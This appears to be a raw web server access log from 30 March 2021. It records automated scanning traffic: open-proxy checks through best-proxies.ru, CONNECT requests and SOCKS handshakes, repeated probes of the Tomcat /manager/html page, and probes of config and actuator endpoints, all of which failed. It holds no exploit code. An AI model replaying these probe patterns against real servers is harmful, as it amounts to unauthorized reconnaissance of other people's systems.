85.119.151.250 - - [30/Mar/2021:02:49:26 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIEYUOOKIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.254 - - [30/Mar/2021:02:49:31 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:02:49:36 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:02:49:41 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:02:51:54 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNPDPRKOKIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
85.119.151.253 - - [30/Mar/2021:02:51:59 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:02:52:04 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:02:52:09 +0000] "\x05\x01\x00" 400 157 "-" "-"
193.118.53.210 - - [30/Mar/2021:03:00:36 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.62.143 - - [30/Mar/2021:03:01:35 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:03:44:32 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.17.97.34 - - [30/Mar/2021:04:21:54 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.56.172 - - [30/Mar/2021:04:27:47 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.17.97.58 - - [30/Mar/2021:04:35:09 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [30/Mar/2021:04:35:23 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
152.67.42.78 - - [30/Mar/2021:05:28:49 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:05:49:15 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIPEOBPDUIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.253 - - [30/Mar/2021:05:49:21 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [30/Mar/2021:05:49:26 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:05:49:31 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.251 - - [30/Mar/2021:05:52:15 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDIEMDODUIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"
85.119.151.254 - - [30/Mar/2021:05:52:20 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:05:52:25 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:05:52:30 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:06:29:09 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
36.84.216.166 - - [30/Mar/2021:07:23:55 +0000] "GET http://www.google.com/ HTTP/1.0" 404 2599 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
209.141.62.143 - - [30/Mar/2021:07:50:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [30/Mar/2021:08:11:17 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [30/Mar/2021:08:30:35 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.222.179 - - [30/Mar/2021:08:38:00 +0000] "GET /actuator/health HTTP/1.1" 404 1056 "-" "Mozilla/5.0 zgrab/0.x"
85.119.151.253 - - [30/Mar/2021:08:47:15 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPONOMDVENIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
85.119.151.252 - - [30/Mar/2021:08:47:19 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:08:47:24 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:08:47:29 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:08:47:37 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUNDYBVENIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
85.119.151.250 - - [30/Mar/2021:08:47:41 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [30/Mar/2021:08:47:46 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [30/Mar/2021:08:47:51 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [30/Mar/2021:09:13:39 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
139.162.79.87 - - [30/Mar/2021:09:38:12 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0"
209.141.62.143 - - [30/Mar/2021:10:43:01 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:11:22:38 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEPRKBPDVRKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
85.119.151.252 - - [30/Mar/2021:11:22:43 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:11:22:48 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [30/Mar/2021:11:22:53 +0000] "\x05\x01\x00" 400 157 "-" "-"
162.142.125.55 - - [30/Mar/2021:11:26:09 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
